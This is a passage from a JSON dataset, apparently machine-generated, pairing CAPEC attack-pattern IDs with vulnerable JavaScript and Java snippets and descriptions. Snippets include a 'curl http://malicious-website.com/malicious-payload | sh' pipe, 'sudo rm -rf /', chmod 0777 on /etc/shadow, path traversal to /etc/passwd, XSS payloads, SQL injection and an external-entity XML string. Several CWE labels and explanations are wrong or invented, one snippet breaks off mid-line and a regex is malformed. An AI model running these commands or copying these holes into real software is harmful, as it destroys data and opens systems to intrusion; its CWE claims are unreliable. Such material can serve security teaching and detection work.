        "code_snippet": "const adminRole = 'admin';\nconst userRole = 'user';\n\nfunction elevatePrivileges(role) {\n  if (role === userRole) {\n    // CWE-269: Improper Privilege Management\n    // CWE-274: Improper Handling of Insufficient Privileges\n    return adminRole;\n  }\n  return role;\n}\n\nfunction performAction(role, action) {\n  if (role === adminRole) {\n    // CWE-653: Improper Isolation or Compartmentalization\n    // CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n    // CWE-1311: Improper Translation of Security Attributes by Fabric Bridge\n    return action();\n  }\n  throw new Error('Unauthorized');\n}\n\nconst user = { role: userRole };\nconst elevatedRole = elevatePrivileges(user.role);\nperformAction(elevatedRole, function() {\n  console.log('Performing admin action');\n});",
        "description": "This code snippet demonstrates the CAPEC of privilege escalation, where an adversary exploits weaknesses in privilege management to elevate their privileges and perform unauthorized actions. The code includes CWE-269, CWE-274, CWE-653, CWE-1264, and CWE-1311 vulnerabilities, which contribute to the privilege escalation vulnerability."
    },
    {
        "capec_id": "234",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction elevatedPrivileges() {\n  // Incorrect permission assignment for critical resource (CWE-732)\n  const criticalResource = '/etc/shadow';\n  fs.chmodSync(criticalResource, '0777');\n\n  // Incorrect use of privileged APIs (CWE-648)\n  const privilegedCmd = 'sudo rm -rf /';\n  exec(privilegedCmd, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n\n  // Execution with unnecessary privileges (CWE-250)\n  const unnecessaryPrivilegesCmd = 'sudo npm install';\n  exec(unnecessaryPrivilegesCmd, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n\n  // Process control (CWE-114)\n  const untrustedCmd = 'curl http://malicious-website.com/malicious-payload | sh';\n  exec(untrustedCmd, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n\n  // Privilege dropping/lowering errors (CWE-271)\n  const dropPrivilegesCmd = 'sudo -u nobody whoami';\n  exec(dropPrivilegesCmd, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\nelevatedPrivileges();",
        "description": "This code snippet demonstrates the CAPEC of gaining control of a process with elevated privileges to execute arbitrary code. It includes examples of CWE-732 (incorrect permission assignment), CWE-648 (incorrect use of privileged APIs), CWE-250 (execution with unnecessary privileges), CWE-114 (process control), and CWE-271 (privilege dropping/lowering errors)."
    },
    {
        "capec_id": "235",
        "code_snippet": "const express = require('express');\nconst app = express();\n\nlet adminSession = null;\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'password') {\n    adminSession = req.session;\n    res.send('Logged in as admin');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/adminPanel', (req, res) => {\n  if (adminSession === req.session) {\n    res.send('Welcome to the admin panel');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\napp.ioctl = (req, res) => {\n  // Exposed IOCTL with insufficient access control\n  if (req.query.action === 'deleteData') {\n    // Delete sensitive data\n    res.send('Data deleted');\n  }\n};\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that embodies the deprecated CAPEC pattern. It includes multiple CWEs: CWE-294 (Authentication Bypass by Capture-replay) due to the lack of secure session management, CWE-1058 (Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element) because of the use of a non-final static variable 'adminSession', and CWE-782 (Exposed IOCTL with Insufficient Access Control) due to the exposed IOCTL functionality without proper access control. An attacker can exploit these weaknesses to bypass authentication, access the admin panel, and perform sensitive actions."
    },
    {
        "capec_id": "236",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  if (req.headers['x-auth-token'] === 'admin_token') {\n    // Unchecked Error Condition (CWE-391)\n    try {\n      // Exposed IOCTL with Insufficient Access Control (CWE-782)\n      const ioctl = require('ioctl');\n      ioctl.doSomethingSensitive();\n    } catch (e) {}\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Signal Handler with Functionality that is not Asynchronous-Safe (CWE-828)\nprocess.on('SIGINT', () => {\n  console.log('Received SIGINT signal');\n  // Non-asynchronous-safe code\n  for (let i = 0; i < 1000000; i++) {}\n});\n\n// Authentication Bypass by Capture-replay (CWE-294)\nconst token = 'admin_token';\napp.get('/capture-replay', (req, res) => {\n  res.set('x-auth-token', token);\n  res.redirect('/admin');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that embodies the deprecated CAPEC pattern. It includes multiple CWEs: CWE-391 (Unchecked Error Condition) by ignoring exceptions, CWE-782 (Exposed IOCTL with Insufficient Access Control) by allowing unrestricted access to sensitive functionality, CWE-828 (Signal Handler with Functionality that is not Asynchronous-Safe) by defining a non-asynchronous-safe signal handler, and CWE-294 (Authentication Bypass by Capture-replay) by allowing an attacker to bypass authentication by replaying a captured token."
    },
    {
        "capec_id": "237",
        "code_snippet": "java.lang.Runtime.getRuntime().exec(\"/bin/bash -c 'whoami' > /tmp/output\");",
        "description": "This Java code snippet demonstrates the CAPEC of escaping a sandbox by submitting malicious code to obtain access to privileges not intentionally exposed. It uses the CWE-111 Direct Use of Unsafe JNI to call native code, bypassing the JVM's restrictions. The code executes a system call to run the 'whoami' command, which is not allowed in a sandboxed environment. This code can be used to gain unauthorized access to the system."
    },
    {
        "capec_id": "238",
        "code_snippet": "const isAdmin = true;\n\nfunction authorize(url) {\n  if (isAdmin) {\n    // authorization before parsing and canonicalization\n    const parsedUrl = parseUrl(url);\n    if (parsedUrl.pathname === '/admin') {\n      return true;\n    }\n  }\n  return false;\n}\n\nfunction parseUrl(url) {\n  // insufficient isolation of symbolic constant definitions\n  const PROTOCOL_REGEX = /^https?:\\/\\/\\/;\n  const MATCH_PROTOCOL = url.match(PROTOCOL_REGEX);\n  if (MATCH_PROTOCOL) {\n    return {\n      protocol: MATCH_PROTOCOL[0],\n      pathname: url.replace(MATCH_PROTOCOL[0], '')\n    };\n  }\n  return {\n    protocol: 'http:',\n    pathname: url\n  };\n}\n\nfunction accessRestrictedResource(url) {\n  if (authorize(url)) {\n    // violation of secure design principles\n    // always-incorrect control flow implementation\n    if (url.pathname === '/admin') {\n      return 'Access granted.';\n    } else {\n      return 'Access denied.';\n    }\n  } else {\n    // improper protection of alternate path\n    return 'Access denied.';\n  }\n}\n\nconsole.log(accessRestrictedResource('http://example.com/admin'));",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that embodies the main idea of the deprecated CAPEC attack pattern. It includes CWEs such as incorrect behavior order: authorization before parsing and canonicalization, insufficient isolation of symbolic constant definitions, violation of secure design principles, always-incorrect control flow implementation, and improper protection of alternate path. The code has a flawed authorization mechanism that can be bypassed by an attacker."
    },
    {
        "capec_id": "239",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.get('/admin', (req, res) => {\n  if (req.query.password === 'letmein') {\n    res.sendFile(__dirname + '/admin.html');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that relies on client-side authentication (CWE-603) and enforces security mechanisms on the client-side (CWE-602). The server trusts the client to provide the correct password, which can be easily bypassed by modifying the client-side code. Additionally, the code exposes a version-control repository (CWE-527) by storing it in a publicly accessible directory. An attacker can exploit these weaknesses to gain unauthorized access to the admin panel."
    },
    {
        "capec_id": "240",
        "code_snippet": "const fs = require('fs');\nconst userInput = '../../../../etc/passwd';\nfs.readFile(userInput, (err, data) => {\n  if (err) {\n    console.error(err);\n    return;\n  }\n  console.log(data);\n});",
        "description": "This code snippet demonstrates the CAPEC of exploiting weaknesses in input validation by manipulating resource identifiers, enabling the unintended modification or specification of a resource. The userInput variable is not properly validated, allowing an attacker to specify a file outside the intended sphere of control, such as the /etc/passwd file. This is an example of CWE-99: Improper Control of Resource Identifiers ('Resource Injection'), CWE-20: Improper Input Validation, and CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input."
    },
    {
        "capec_id": "241",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.bodyParser()); // CWE-592: Using a deprecated middleware\n\napp.get('/', (req, res) => {\n  const user = req.query.user;\n  const password = req.query.password;\n  const query = \"SELECT * FROM users WHERE user='\" + user + \"' AND password='\" + password + \"';\";\n  db.query(query, (err, rows) => {\n    if (err) {\n      res.send('Error');\n    } else {\n      res.send('Welcome, ' + user);\n    }\n  });\n});\n\nconst db = require('mysql').createConnection({ // CWE-545: Using dynamic class loading\n  host: 'localhost',\n  user: 'root',\n  password: 'password'\n});\n\nconst fs = require('fs');\nfs.readFile('file.txt', 'utf8', (err, data) => {\n  if (err) {\n    console.log(err);\n  } else {\n    console.log(data);\n  }\n});\n\nconst deprecatedFunction = require('deprecated-module').deprecatedFunction; // CWE-477: Using an obsolete function\ndeprecatedFunction();",
        "description": "This code snippet demonstrates the deprecated CAPEC pattern, which is a duplicate of CAPEC-242: Code Injection. It uses a deprecated middleware (CWE-592), dynamic class loading (CWE-545), and an obsolete function (CWE-477). The code is also vulnerable to SQL injection due to the use of user-input data in the SQL query."
    },
    {
        "capec_id": "242",
        "code_snippet": "const userInput = \"'); alert('Vulnerable'); var dummy = ('\";\nconst maliciousScript = `<script> ${userInput} </script>`;\ndocument.body.innerHTML = maliciousScript;",
        "description": "This JavaScript code snippet demonstrates code injection vulnerability (CWE-94) by constructing a code segment using user input without proper validation or neutralization of special elements. An attacker can inject malicious code, such as a script tag, to execute arbitrary commands, like displaying an alert box in this example. This code also relates to CWE-506 (Embedded Malicious Code), CWE-74 (Improper Neutralization of Special Elements in Output), CWE-1173 (Improper Use of Validation Framework), and CWE-77 (Improper Neutralization of Special Elements used in a Command)."
    },
    {
        "capec_id": "243",
        "code_snippet": "const userInput = \"<a href='' onmouseover='alert(1)'>Click me!</a>\";\nconst htmlElement = document.createElement('div');\nhtmlElement.innerHTML = userInput;\ndocument.body.appendChild(htmlElement);",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability. It takes user input and inserts it into an HTML element without proper sanitization, allowing an attacker to inject malicious code. The onmouseover event in the anchor tag can trigger an alert box when the user hovers over the link, demonstrating the execution of malicious code."
    },
    {
        "capec_id": "244",
        "code_snippet": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">Click me!</a>",
        "description": "This code snippet demonstrates a malicious anchor tag with a base64 encoded HTML content containing a cross-site scripting payload. The payload is a JavaScript alert box that will execute when the victim clicks on the link, exploiting improper neutralization of script in attributes in a web page (CWE-83) and improper neutralization of encoded URI schemes in a web page (CWE-84)."
    },
    {
        "capec_id": "245",
        "code_snippet": "const userInput = \"<<script>alert('XSS')</script>>\";\nconst vulnerableApp = (input) => {\n  const html = `<div>${input}</div>`;\n  document.body.innerHTML = html;\n};\nvulnerableApp(userInput);",
        "description": "This code snippet demonstrates a vulnerable web application that fails to properly neutralize script-related HTML tags, allowing an adversary to bypass input validation using doubled characters and perform a cross-site scripting attack."
    },
    {
        "capec_id": "246",
        "code_snippet": "const userInput = '<img src=\"x\" onerror=\"alert(1)\">';\nconst denylist = ['<script>', '<iframe>', '<svg>', '<math>'];\nlet sanitizedInput = userInput;\nfor (let i = 0; i < denylist.length; i++) {\n  sanitizedInput = sanitizedInput.replace(denylist[i], '');\n}\ndocument.getElementById('user-input').innerHTML = sanitizedInput;",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to Stored XSS attacks due to an incomplete denylist and improper neutralization of alternate XSS syntax. The code takes user input and attempts to sanitize it by removing certain script tags, but it fails to account for other possible XSS vectors, such as the onerror attribute in the img tag."
    },
    {
        "capec_id": "247",
        "code_snippet": "const userInput = \"<script>alert('XSS')</script>\r\n\"><img src=x onerror=alert('XSS')>;\";\nlet identifier = \"div\" + userInput + \"_id\";\nlet html = '<' + identifier + '>Some content</' + identifier + '>';\ndocument.body.innerHTML = html;",
        "description": "This code snippet demonstrates a vulnerability to XSS attacks by improperly neutralizing invalid characters in identifiers. The userInput variable contains a script tag and newline characters, which are not properly sanitized. The identifier variable is then constructed by concatenating the userInput with a valid identifier, allowing the malicious script to be injected into the HTML. The resulting HTML is then set as the innerHTML of the document body, executing the malicious script."
    },
    {
        "capec_id": "248",
        "code_snippet": "const userInput = 'rm -rf *';\nconst command = `sudo rm ${userInput}`;\nconst child = require('child_process').exec(command);\nchild.stdout.on('data', (data) => {\n  console.log(`stdout: ${data}`);\n});",
        "description": "This code snippet demonstrates command injection vulnerability. It takes user input and injects it into a command string without proper validation or sanitization, allowing an attacker to inject malicious commands and execute them with elevated privileges."
    },
    {
        "capec_id": "249",
        "code_snippet": "const exec = require('child_process').exec;\nconst userInput = 'ls; rm -rf /'; // malicious input\nexec(`ssh user@host '${userInput}'`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This code snippet demonstrates command injection vulnerability (CWE-78) where user input is not properly sanitized before being used in an OS command. The malicious input 'ls; rm -rf /' can lead to unintended consequences such as deleting files on the remote server."
    },
    {
        "capec_id": "250",
        "code_snippet": "const xpath = require('xpath');\nconst xmldoc = require('xmldoc');\n\nfunction queryXmlDatabase(xmlData, query) {\n  const xmlDoc = new xmldoc.XmlDocument(xmlData);\n  const xpathExpression = xpath.parse('/users/user[username=\\'' + query + '\\']');\n  const results = xpath.apply(xmlDoc);\n  return results;\n}\n\nconst userInput = \\",
        "description": "This JavaScript code snippet demonstrates an XML injection vulnerability. The 'queryXmlDatabase' function takes user-controllable input 'query' and uses it to construct an XPath expression to query an XML database. The input is not properly sanitized, allowing an attacker to inject malicious XPath expressions and access unauthorized data. In this example, the 'userInput' variable contains a malicious query that will return all users in the XML database, demonstrating a bypass of authentication."
    },
    {
        "capec_id": "251",
        "code_snippet": "let libPath = './lib/old_vulnerable_lib.js';\nlet maliciousCode = 'const process = require(\"child_process\"); process.exec(\"rm -rf /\");';\n\nfunction loadLibrary() {\n  global.lib = require(libPath);\n  lib.init();\n}\n\nfunction executeMaliciousCode() {\n  eval(maliciousCode);\n}\n\nloadLibrary();\nexecuteMaliciousCode();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of forcing an application to load arbitrary code files from the local machine. It includes CWE-829 by loading a library from an untrusted control sphere, CWE-506 by embedding malicious code, CWE-913 by improperly controlling dynamically-managed code resources, CWE-1108 by relying on global variables, and CWE-1102 by relying on machine-dependent data representation. The code loads a potentially vulnerable library and executes malicious code, showcasing the risks of arbitrary code loading."
    },
    {
        "capec_id": "252",
        "code_snippet": "let userInput = \"../../../../../../../../etc/passwd\";\n\nlet fs = require('fs');\nlet vm = require('vm');\n\nfs.readFile(userInput, function(err, data) {\n    if (err) {\n        console.error(err);\n    } else {\n        vm.runInThisContext(data, userInput);\n    }\n});",
        "description": "This JavaScript code snippet demonstrates the concept of PHP Remote File Inclusion vulnerability, where an attacker can load and execute an arbitrary local PHP file on a target machine. The code reads a file specified by user input and executes it using the vm module, allowing an attacker to potentially execute malicious code. This is a representation of CWE-98, CWE-829, CWE-646, CWE-616, and CWE-473."
    },
    {
        "capec_id": "253",
        "code_snippet": "const fs = require('fs'); const https = require('https'); const url = 'https://example.com/maliciousLibrary.js'; https.get(url, (res) => { let data = ''; res.on('data', (chunk) => { data += chunk; }); res.on('end', () => { const maliciousCode = eval(data); }); }).on('error', (err) => { console.error(err); });",
        "description": "This JavaScript code snippet demonstrates the CAPEC of loading arbitrary code files from a remote location. It uses the 'https' module to download a JavaScript file from a remote URL and then executes the code using the 'eval' function, without performing any integrity checks. This code is vulnerable to CWE-494 (Download of Code Without Integrity Check), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "254",
        "code_snippet": "const parser = new DOMParser();\nconst xmlString = '<!DOCTYPE doc [<!ENTITY ent SYSTEM \"http://example.com/evil.dtd\">]><doc>&ent;</doc>';\nconst xmlDoc = parser.parseFromString(xmlString, 'application/xml');\nconsole.log(xmlDoc.documentElement.textContent);",
        "description": "This JavaScript code snippet demonstrates a DTD injection vulnerability (CAPEC-228) by parsing a malicious XML string with an external DTD reference. The code allows an attacker to inject arbitrary DTDs, potentially leading to information exposure, resource consumption, or arbitrary HTTP requests. This code relates to CWE-827 (Improper Control of Document Type Definition) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs)."
    },
    {
        "capec_id": "256",
        "code_snippet": "function processSOAPRequest(soapRequest) {\n  var arrayLength = soapRequest.arrayLength;\n  var dataArray = new Array(arrayLength);\n  for (var i = 0; i < soapRequest.data.length; i++) {\n    dataArray[i] = soapRequest.data[i];\n  }\n  // Process the dataArray\n  processData(dataArray);\n}\n\n// Example SOAP request\nvar soapRequest = {\n  arrayLength: 5,\n  data: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n};\n\nprocessSOAPRequest(soapRequest);",
        "description": "This code snippet demonstrates a vulnerable SOAP request processor in JavaScript. The function processSOAPRequest() trusts the arrayLength specified in the SOAP request and allocates a buffer of that size. However, it then copies the entire data array into the buffer without checking its size, leading to a buffer overflow. This is an example of CWE-805, CWE-130, CWE-806, CWE-120, and CWE-122."
    },
    {
        "capec_id": "257",
        "code_snippet": "const fs = require('fs');\nconst debugLog = fs.createWriteStream('debug.log', { flags: 'a' });\nconst serverLog = fs.createWriteStream('server.log', { flags: 'a' });\n\n// CWE-217: Failure to Protect Stored Data from Modification\nlet storedData = { username: 'admin', password: 'password' };\nfs.writeFileSync('storedData.json', JSON.stringify(storedData));\n\n// CWE-218: Failure to provide confidentiality for stored data\nlet confidentialData = 'secretKey';\nfs.writeFileSync('confidentialData.txt', confidentialData);\n\n// CWE-534: Information Exposure Through Debug Log Files\ndebugLog.write('Debug: ' + storedData.username + ':' + storedData.password + '\\n');\n\n// CWE-533: Information Exposure Through Server Log Files\nserverLog.write('Server: ' + confidentialData + '\\n');\n\n// CWE-592: Authentication Bypass Issues\nlet authenticate = (username, password) => {\n  if (username === 'admin' && password === 'password') {\n    return true;\n  } else {\n    return false;\n  }\n};",
        "description": "This code snippet demonstrates a deprecated CAPEC attack pattern, which incorporates multiple CWEs. It includes failure to protect stored data from modification (CWE-217), failure to provide confidentiality for stored data (CWE-218), information exposure through debug log files (CWE-534), information exposure through server log files (CWE-533), and authentication bypass issues (CWE-592). The code writes sensitive data to files without proper protection, logs confidential information, and has a weak authentication mechanism."
    },
    {
        "capec_id": "258",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  // CWE-294: Authentication Bypass by Capture-replay\n  // CWE-603: Use of Client-Side Authentication\n  if (username === 'admin' && password === 'password') {\n    res.cookie('auth', 'true');\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const authCookie = req.cookies.auth;\n\n  // CWE-603: Use of Client-Side Authentication\n  if (authCookie === 'true') {\n    res.send('Welcome, authenticated user!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be bypassed using capture-replay attacks (CWE-294) and client-side authentication (CWE-603). The server-side authentication is omitted, allowing an attacker to modify the client-side code to bypass the authentication check. Additionally, the code uses a non-ubiquitous API (CWE-589) by relying on the express.js framework, which may cause portability issues."
    },
    {
        "capec_id": "259",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (username === 'admin' && password === 'password') {\n    res.cookie('auth', 'true');\n    res.send('Login successful');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.cookies.auth === 'true') {\n    res.send('Welcome, authenticated user!');\n  } else {\n    res.send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be bypassed using a capture-replay attack (CWE-294). The server-side authentication is weak and relies on a client-side cookie to verify the user's authentication status. An attacker can sniff the network traffic, capture the authentication cookie, and replay it to access the protected resource without providing valid credentials. Additionally, the code uses a non-ubiquitous API (CWE-589) by relying on the express.js framework, which may not be compatible with all versions of Node.js. The code also lacks proper input validation and error handling, making it vulnerable to other types of attacks."
    },
    {
        "capec_id": "260",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  \n  // CWE-294: Authentication Bypass by Capture-replay\n  // CWE-603: Use of Client-Side Authentication\n  if (username === 'admin' && password === 'password') {\n    res.cookie('auth', 'true');\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.cookies.auth === 'true') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication system that can be bypassed using capture-replay attacks (CWE-294) and client-side authentication (CWE-603). An attacker can sniff the network traffic, capture the authentication request, and replay it to gain unauthorized access to the protected resource."
    },
    {
        "capec_id": "261",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/users', (req, res) => {\n  const query = `SELECT * FROM users WHERE name LIKE '%${req.query.name}%'`;\n  db.query(query, (err, rows) => {\n    if (err) {\n      console.error(err);\n      res.status(500).send(`Error: ${err.sqlMessage}`);\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet is vulnerable to SQL injection and improper input validation, allowing an attacker to send modified queries to access sensitive information. The code uses user input directly in the SQL query without proper sanitization, making it possible for an attacker to inject malicious SQL code. Additionally, the error handling mechanism discloses sensitive information about the database environment through error messages."
    },
    {
        "capec_id": "263",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processFile(file) {\n    const filePath = path.join(__dirname, file);\n    fs.readFile(filePath, (err, data) => {\n        if (err) {\n            console.error(err);\n            return;\n        }\n        try {\n            // Insecurely process the file without validation\n            const fileContent = JSON.parse(data);\n            console.log(fileContent);\n        } catch (e) {\n            console.error(e);\n        }\n    });\n}\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst untrustedLibrary = require('./untrusted-library');\nprocessFile(untrustedLibrary);\n\n// CWE-377: Insecure Temporary File\nconst tempFile = 'temp-' + Math.random() + '.txt';\nfs.writeFileSync(tempFile, 'temporary file content');\nprocessFile(tempFile);\n\n// CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nconst uploadedFile = 'uploaded-malicious-file.exe';\nprocessFile(uploadedFile);\n\n// CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nconst adsFile = 'file-with-ads.txt:malicious-data';\nprocessFile(adsFile);\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nconst dangerousFile = 'malicious-file.bat';\nprocessFile(dangerousFile);\n",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that processes files without proper validation, leading to potential security issues. It includes examples of CWE-829 (inclusion of untrusted library), CWE-377 (insecure temporary file), CWE-646 (reliance on file name or extension), CWE-69 (improper handling of alternate data streams), and CWE-434 (unrestricted upload of file with dangerous type)."
    },
    {
        "capec_id": "264",
        "code_snippet": "var globalConfig = {env: 'dev'};\nfunction getConfig() {\n  var env = globalConfig.env;\n  var config = {\n    'dev': 'development environment',\n    'prod': 'production environment'\n  };\n  return eval('config.' + env);\n}\n\n// Using global variable\nfunction setEnvironment(env) {\n  globalConfig.env = env;\n}\n\n// Insufficient isolation of symbolic constant definitions\nvar MAX_RETRIES = 3;\n\nfunction retryOperation() {\n  for (var i = 0; i < MAX_RETRIES; i++) {\n    // operation\n  }\n}\n\n// Insufficient use of symbolic constants\nfunction displayMessage() {\n  console.log('Welcome to ' + 'development environment');\n}\n\n// Declaration of variable with unnecessarily wide scope\nvar globalVariable = 'global';\nfunction localFunction() {\n  var localVariable = 'local';\n  console.log(globalVariable);\n}",
        "description": "This code snippet demonstrates the deprecated CAPEC pattern, which is a duplicate of CAPEC-13. It includes various CWEs such as Eval Injection (CWE-95), Declaration of Variable with Unnecessarily Wide Scope (CWE-1126), Insufficient Isolation of Symbolic Constant Definitions (CWE-1107), Insufficient Use of Symbolic Constants (CWE-1106), and Excessive Reliance on Global Variables (CWE-1108). The code uses a global variable, relies on eval() for dynamic evaluation, and declares variables with unnecessarily wide scope. It also uses literal constants instead of symbolic constants and does not isolate symbolic constant definitions."
    },
    {
        "capec_id": "265",
        "code_snippet": "let globalVariable = 'initialValue';\n\nfunction outerFunction() {\n  let outerVariable = 'outerValue';\n  function innerFunction() {\n    let innerVariable = 'innerValue';\n    eval('globalVariable = \\'hackedValue\\';');\n    console.log(window[outerVariable]);\n    console.log(this[innerVariable]);\n  }\n  innerFunction();\n}\nouterFunction();",
        "description": "This code snippet demonstrates excessive reliance on global variables and improper control of dynamically-identified variables. The globalVariable is declared at the top level and is modified within the innerFunction using eval(). The outerVariable and innerVariable are also accessed dynamically using the window and this objects. This code is vulnerable to dynamic variable evaluation and can lead to unauthorized access to variables and functions."
    },
    {
        "capec_id": "266",
        "code_snippet": "function evaluateInput(input) {\n  const userInput = validateInput(input);\n  const canonicalizedInput = canonicalizeInput(userInput);\n  const obj = {};\n  eval('obj.' + canonicalizedInput + ' = 1');\n  return obj;\n}\n\nfunction validateInput(input) {\n  if (input.includes('=')) {\n    return input;\n  } else {\n    return 'invalid';\n  }\n}\n\nfunction canonicalizeInput(input) {\n  return input.replace(/[^a-zA-Z0-9_]/g, '');\n}\n",
        "description": "This code snippet demonstrates the deprecated CAPEC attack pattern, which involves incorrect behavior order, where input is validated before it is canonicalized. The code uses eval() to dynamically evaluate user input, which can lead to code injection vulnerabilities (CWE-95). The validateInput() function checks if the input contains an '=' character, and the canonicalizeInput() function removes non-alphanumeric characters. However, an attacker can still inject malicious code by providing a carefully crafted input that passes the validation and canonicalization steps."
    },
    {
        "capec_id": "267",
        "code_snippet": "const userInput = '<script>alert(\"XSS\")</script>'; const encodedInput = encodeURIComponent(userInput); const decodedInput = decodeURIComponent(encodedInput); const userInputPath = `./uploads/${decodedInput}.txt`; fs.writeFileSync(userInputPath, 'malicious content');",
        "description": "This code snippet demonstrates the CAPEC of leveraging alternate encoding to bypass input validation. The userInput is encoded using encodeURIComponent, but the decodeURIComponent function is used to decode it, which can lead to unexpected values (CWE-172). The decoded input is then used to construct a file path, allowing an attacker to control the file name or path (CWE-73). Additionally, the code does not properly validate the input, making it vulnerable to XSS attacks (CWE-20, CWE-74, CWE-692). The incorrect behavior order of validating before canonicalizing and filtering also contributes to the vulnerability (CWE-180, CWE-181)."
    },
    {
        "capec_id": "268",
        "code_snippet": "const fs = require('fs');\nconst logFile = './log.txt';\n\n// CWE-117: Improper Output Neutralization for Logs\nfunction logEvent(event) {\n  fs.appendFile(logFile, event + '\\n', (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n}\n\n// CWE-532: Insertion of Sensitive Information into Log File\nlogEvent('User credentials: username=' + user.username + ', password=' + user.password);\n\n// CWE-779: Logging of Excessive Data\nfor (let i = 0; i < 1000; i++) {\n  logEvent('Excessive log entry ' + i);\n}\n\n// CWE-778: Insufficient Logging\nfunction handleSecurityCriticalEvent(event) {\n  // No logging or incomplete logging of security-critical event\n}\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nlogEvent('System information: ' + process.env);\n",
        "description": "This code snippet demonstrates the CAPEC of log manipulation by injecting malicious log entries into a log file. It uses the CWEs to illustrate the vulnerabilities: CWE-117 by not neutralizing output, CWE-532 by logging sensitive user information, CWE-779 by logging excessive data, CWE-778 by not logging security-critical events, and CWE-497 by exposing sensitive system information."
    },
    {
        "capec_id": "269",
        "code_snippet": "const regKey = require('registry-js');\n\n// CWE-314: Cleartext Storage in the Registry\nregKey.set('HKCU\\Software\\MyApp', 'password', 'mysecretpassword');\n\n// CWE-270: Privilege Context Switching Error\nconst exec = require('child_process').exec;\nexec('runas /user:admin reg add HKCU\\Software\\MyApp /v password /t REG_SZ /d mysecretpassword /f', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`Registry value set successfully`);\n});\n\n// CWE-1112: Incomplete Documentation of Program Execution\n// No documentation on how the registry value is used to control program execution\n\n// CWE-217 (Deprecated): Failure to Protect Stored Data from Modification\n// No protection mechanism to prevent modification of the stored registry value\n",
        "description": "This code snippet demonstrates the CAPEC-203 pattern by manipulating application registry values. It stores sensitive information in cleartext in the registry (CWE-314), switches privileges without proper management (CWE-270), lacks documentation on how the registry value is used to control program execution (CWE-1112), and fails to protect stored data from modification (CWE-217)."
    },
    {
        "capec_id": "270",
